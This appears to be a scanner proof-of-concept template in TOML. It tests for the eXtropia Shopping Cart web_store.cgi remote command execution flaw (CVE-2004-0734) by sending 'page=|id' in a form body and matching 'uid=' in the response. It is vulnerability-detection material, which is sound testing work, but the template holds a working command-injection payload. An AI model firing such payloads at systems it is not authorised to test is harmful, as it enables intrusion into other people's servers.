[info]
author = "ave"
description = "验证目标是否存在 eXtropia Shopping Cart web_store.cgi 远程命令执行漏洞，通过 page 参数注入 shell 元字符尝试执行系统命令"
id = "POC-AVE-2004-0013"
name = "eXtropia Shopping Cart web_store.cgi 远程命令执行漏洞 PoC"
severity = "high"
tags = ["ave-2004-0013"]
vuln_id = [
    "CVE-2004-0734",
    "AVE-2004-0013",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/web_store.cgi"
protocol = "http"

[poc.requests.body]
content = "page=|id"
type = "form"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["uid="]
